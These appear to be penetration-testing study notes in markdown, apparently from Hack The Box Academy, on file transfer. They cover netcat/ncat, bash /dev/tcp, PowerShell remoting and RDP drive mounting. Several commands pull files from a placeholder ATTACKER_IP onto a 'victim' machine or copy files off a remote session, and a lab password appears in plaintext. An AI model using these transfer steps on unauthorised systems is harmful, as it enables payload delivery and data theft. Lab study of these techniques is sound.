# File Transfers
## @Author : M3tr1c_r00t
### Miscellaneous File Transfer
#### Netcat
Netcat, also known as nc, is a versatile command-line tool for networking that can be used for reading or writing data across network connections. It is often referred to as a "Swiss Army knife" for TCP/IP networking because it can perform a wide range of tasks, such as port scanning, file transfer, and network debugging.

Netcat allows you to establish TCP or UDP connections, listen on ports for incoming connections, and redirect data streams. It can also act as a simple server or client, and can be used to transfer files between machines.

Some of the most common use cases for netcat include:
- Port scanning: Netcat can be used to check which ports are open on a remote system by attempting to connect to them.
- Chatting: Netcat can be used to have a simple chat between two users on different machines.
- Transferring files: Netcat can be used to transfer files between machines by reading from one machine and writing to the other.

#### Ncat
Ncat is a modern, feature-rich version of the classic netcat tool. It is part of the Nmap suite of network security tools and is designed to provide a more secure and flexible way of performing many of the same networking tasks as netcat, as well as some additional functionality.

Like netcat, Ncat can be used to create TCP or UDP connections, listen on ports for incoming connections, and redirect data streams. It can also be used for port scanning, banner grabbing, and other network debugging tasks.

One of the key differences between Ncat and netcat is that Ncat supports encryption and authentication, which makes it more secure and suitable for use in sensitive environments. Ncat supports a wide range of encryption algorithms, including SSL, TLS, and SSH, and can be used to create secure tunnels between machines.

Another important feature of Ncat is its support for IPv6, which makes it a useful tool for testing and working with IPv6 networks.

#### File Transfer Using Netcat and Ncat
##### Method1
__(nc)Target Machine/victim__;
```
#This will be recieving the file on port 8000(-p) in listen mode(-l).
nc -l -p 8000 > file.exe
```
__(Ncat)Target Machine/victim__;
```
#--recv-only will close the connection after the file transfer is completed.
ncat -l -p 8000 --recv-only > file.exe
```

__(nc)Attacker Machine__;
```
# -q 0 tells netcat to close the connection after the full file transfer.
nc -q 0 TARGET_IP 8000 < file.txt
```
__(Ncat)Attacker Machine__;
```
#--send-only close the connection after the full file transfer.
ncat --send-only TARGET_IP 8000 < file.exe
```
##### Method 2 (Sending File as an input)
__(nc)Attacker Machine__;
```
sudo nc -l -p 443 -q 0 < file.exe
```
__(Ncat)Attacker Machine__;
```
sudo ncat -l -p 443 --send-only < file.exe
```
__(nc)Target Machine__;
```
nc ATTACKER_IP 443 > file.exe
```
__(Ncat)Target Machine__;
```
ncat ATTACKER_IP 443 --recv-only > file.exe
```
If the target machine doesnt have nc/ncat, we can use bash /dev/tcp to recieve the file.
```
cat < /dev/tcp/ATTACKER_IP/443 > file.exe
```
#### Powershell Session File Transfer
In some cases, HTTP,HTTPS and SMB may be un available.
In this case, we can use powershell remoting which uses the WinRM protocol to establish a secure and authenticated connection.

It is commonly used by administrators to manage remote computers in a network and for file tranfer operations.

By default,if enabled, WinRM listens on default ports such as TCP/5985 for HTTP and TCP/5986 for HTTPS.

In order for us to be able to achieve file transfer, we need to have administrative access.(Be a Member of the Remote Management Users Group./explicit permissions for powershell remoting.)

__Confirming the Winrm Ports are open__;
```
 Test-NetConnection -ComputerName DATABASE01 -Port 5985
 #If it returns true, it is open.(We wont be prompted for a password if we have administrative access.)
```
![image](https://user-images.githubusercontent.com/99975622/222724566-e1c61aef-3cbe-4b39-927c-c3400071aded.png)
Copy samplefile.txt from our Localhost to the DATABASE01 Session
```
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```
Copy DATABASE.txt from DATABASE01 Session to our Localhost
```
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```
#### RDP
![image](https://user-images.githubusercontent.com/99975622/222725436-e642646c-c943-4902-970a-b684f6a98488.png)
Mounting a Linux Folder Using rdesktop
```
MetricCode@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
Mounting a Linux Folder Using xfreerdp
```
MetricCode@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
![image](https://user-images.githubusercontent.com/99975622/222725756-05717f9e-7050-4793-8484-765474b3ed09.png)
![image](https://user-images.githubusercontent.com/99975622/222725993-b1e8ac3e-d3e6-4f1f-b392-ce46d025b983.png)

## My socials:
<br>@ twitter: https://twitter.com/M3tr1c_root
<br>@ instagram: https://instagram.com/m3tr1c_r00t/
   
